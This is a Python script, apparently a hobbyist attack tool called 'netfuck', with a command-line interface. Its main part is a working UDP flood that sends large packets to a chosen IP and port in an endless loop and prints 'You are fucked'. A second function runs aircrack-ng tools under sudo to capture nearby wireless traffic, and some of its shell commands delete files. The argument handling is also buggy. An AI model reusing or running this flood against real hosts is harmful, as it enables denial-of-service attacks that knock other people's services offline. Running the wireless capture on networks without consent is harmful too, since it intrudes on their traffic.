#!/usr/bin/python3
import subprocess
import sys, os, codecs
from optparse import OptionParser
import socket
import threading
from pathlib import Path
from argparse import ArgumentParser

GREEN = '\033[92m'
RED = '\033[31m'
RESET = '\033[0m'
stop_attack = False
output_lock = threading.Lock()

def dos_attack(target_ip, target_port, output_list, index, column_width):
    global stop_attack
    data = b"netfuck" * 10917 #hello
    data2 = b"netfuck" * 10917
    data3 = b"netfuck" * 10917
    data4 = b"netfuck" * 10917
    data5 = b"netfuck" * 10917
    data6 = b"netfuck" * 10917
    data7 = b"netfuck" * 10917
    data8 = b"netfuck" * 10917
    data9 = b"netfuck" * 10917
    data10 = b"netfuck" * 10917
    data11 = b"netfuck" * 10917
    data12 = b"netfuck" * 10917
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    i = 0

    while not stop_attack:
        i += 1
        try:
            sock.sendto(data, (target_ip, target_port))
            sock.sendto(data2, (target_ip, target_port))
            sock.sendto(data3, (target_ip, target_port))
            sock.sendto(data4, (target_ip, target_port))
            sock.sendto(data5, (target_ip, target_port))
            sock.sendto(data6, (target_ip, target_port))
            sock.sendto (data7, (target_ip, target_port))
            sock.sendto(data8, (target_ip, target_port))
            sock.sendto(data9, (target_ip, target_port))
            sock.sendto(data10, (target_ip, target_port))
            sock.sendto(data11, (target_ip, target_port))
            sock.sendto(data12, (target_ip, target_port))
            with output_lock:

                output_list[index] = f"{GREEN}Packet No.{i} sent to {target_ip}:{target_port}{RESET}".ljust(
                    column_width)

            with output_lock:
                print("".join(output_list))

        except Exception as err:
            with output_lock:
                output_list[index] = f"Error: {err}".ljust(column_width)
            break

def ddos(ip: str = None, port: int = 443, instanceNum: int = 1):
    print(f"{RED}You are fucked")
    targets = []

    targets.append((ip, port))
    output_list = [""] * instanceNum
    column_width = 50
    threads = []
    for index, (target_ip, target_port) in enumerate(targets):
        thread = threading.Thread(target=dos_attack, args=(target_ip, target_port, output_list, index, column_width))
        threads.append(thread)
        thread.start()

    try:
        for thread in threads:
            thread.join()

    except KeyboardInterrupt:
        print(f"{RED}\nAttack stopped by user. Exiting...\n{RESET}")
        stop_attack = True

        for thread in threads:
            thread.join()

        print(f"\n,{RED}All threads stopped. Program terminated.\n{RESET}")

def bash(commands):
    subprocess.call(commands, shell=True)

def airscan_commands(netdevice):
    print("Starting Air Scan")
    subprocess.run([f"cd /"], shell=True, check=True)
    subprocess.run([f"sudo mkdir /home/netfuck/"], shell=True)
    subprocess.run([f"sudo airmon-ng start {netdevice}"], shell=True)
    subprocess.run([f"sudo airodump-ng {netdevice}mon -w /home/netfuck/output"], shell=True)
    subprocess.run([f"sudo airgraph-ng -i /home/netfuck/output-01.csv -o /home/netfuck/output.png -g CAPR"], shell=True)
    subprocess.run([f"sudo airmon-ng stop {netdevice}mon"], shell=True)
    subprocess.run([f"xdg-open /home/netfuck/output.png"], shell=True)


def airscan(
        netdevice: str = "wlan0",

    ):
    areyousure = str(input("This will disable networkmanager, are you sure you want to run this program: "))
    if areyousure == "y" or areyousure == "yes":
        try:
            myfile = Path("/home/netfuck/output.png")
            if myfile.is_file():
                airscan_previous_files = input("Previous Files have been found, if you continue they will be overwritten. Are you sure you want to continue? (Y/N): ")
                if airscan_previous_files == "Y" or airscan_previous_files == "yes" or airscan_previous_files == "y":
                    subprocess.run(["sudo chmod 777 /home/netfuck"], shell=True)
                    subprocess.run(["sudo rm -r /home/netfuck/"], shell=True)
                    airscan_commands(netdevice)
                else:
                    exit()
            else:
                airscan_commands(netdevice)

        except KeyboardInterrupt:

            exit(0)

    else:
        print(f"{RED}Exiting")
        exit(0)

if __name__ == "__main__":

    parser = ArgumentParser(prog="netfuck", add_help=True)

    parser.add_argument("-a", "--airscan", dest="airscan", type=str, help="airscan [IP] [PORT]: scans and displays current and closest network.")
    parser.add_argument("-d", "--ddos", dest="ddos", type=str, help="ddos: sends packets to target")
    parser.add_argument("-n", "--nmap", dest="nmap", type=str, help="nmap: scans open ports on target networks")



    (options, args) = parser.parse_known_args()
    print(options)
    print(args)

    if options.airscan:
        airscan(options.airscan)

    if options.ddos:
        if args[0] is None or args[1] is None:
            ddos(options.ddos, int(args[0]), int(args[1]))
        ddos(options.ddos, int(args[0]), int(args[1]))


# Local Variables: ***
# mode: python     ***
# End:             ***